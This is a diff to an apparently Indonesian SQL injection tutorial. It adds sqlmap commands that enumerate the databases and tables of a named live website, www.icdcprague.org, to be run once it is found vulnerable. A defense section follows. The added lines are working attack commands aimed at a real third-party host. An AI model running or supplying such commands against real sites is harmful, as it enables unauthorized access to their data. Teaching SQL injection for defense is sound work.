@@ -233,6 +233,11 @@ cd sqlmap
 python sqlmap.py -u 'http://www.icdcprague.org/index.php?id=10'
 ```
 
+Jika ternyata vulneable bisa dilakukan test lainnya seperti melihat database dan tabelnya
+```bash
+python sqlmap.py -u 'http://www.icdcprague.org/index.php?id=10' --dbs
+python sqlmap.py -u 'http://www.icdcprague.org/index.php?id=10' --tables -D icdcprague
+```
 ### Kesimpulan
 
 #### Defense
